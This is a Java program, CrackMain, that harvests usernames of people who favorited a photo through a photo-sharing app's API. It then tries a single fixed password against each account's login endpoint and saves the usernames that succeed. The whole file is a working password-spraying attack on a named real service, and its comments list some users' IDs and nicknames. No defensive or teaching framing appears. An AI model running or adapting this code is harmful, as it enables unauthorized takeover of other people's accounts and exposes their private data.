package net.lqm.main;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import net.lqm.util.HttpUtils;
import net.lqm.util.ReadFileUtil;

public class CrackMain {
	public static void main(String[] args) {
		//排除项
//		List<String> l1 = ReadFileUtil.readTxtFile("D:\\Documents\\we\\psw.txt", false);
		
		//61066=michlie;61271=柠檬爸爸;61010=wangjunling3
		for(String userId : getFavoriteUsers("61030")) {
			try {
				String name = getUserName(userId);
//			ReadFileUtil.writeTxtFile("D:\\Documents\\we\\my.txt", name);
				String str = loginWeApp(name);
			if(("dieengfei8").equals(str)) {
				break;
			}
				if(str!=null) {
//				if(!l1.contains(str)){
						System.out.println(str);
						ReadFileUtil.writeTxtFile("D:\\Documents\\we\\copy_plus.txt", str);
//				}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	private static List<String> getFavoriteUsers(String imageId) {
		List<String> returnList = new ArrayList<String>();
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/favoriteUsers";
		String param = "{\"parameters\":{\"is_all\":\"1\",\"image_id\":\""+imageId+"\"}}";
		
		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);
		String userListStr = map.get("content").get("favorite_users")+"";
		JSONArray users = (JSONArray)JSON.parse(userListStr);
		for(Object user : users) {
			JSONObject jo = (JSONObject) JSONObject.toJSON(user);
			returnList.add(jo.get("user_id").toString());
		}
		return returnList;
	}
	
	private static String getUserName(String userId) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/photo/otherPublishes";
		String param = "{\"parameters\":{\"user_id\":\""+userId+"\"}}";
		
		String res = HttpUtils.sendPost(url, param);
		JSONObject jo = JSON.parseObject(res);
		JSONObject content = (JSONObject)jo.get("content");
		JSONObject userinfo = (JSONObject)content.get("user_info");
		
		return userinfo.get("username")+"";
	}
	
	private static String loginWeApp(String user) {
		String url = "http://smile.stdecaux.net.cn/stdecaux/api/user/login";
		String param = "{\"parameters\":{\"version\":\"1.3.0\",\"username\":\"" + user + "\",\"password\":\""+"qqq123456"+"\"}}";

		String res = HttpUtils.sendPost(url, param);

		Map<String, JSONObject> map = (Map<String, JSONObject>) JSON.parse(res);

		try {
			map.get("content").get("token").toString();
			return user;
		} catch (Exception e) {
//			System.out.println("password is wrong： "+user);
		}
		return null;
	}
}
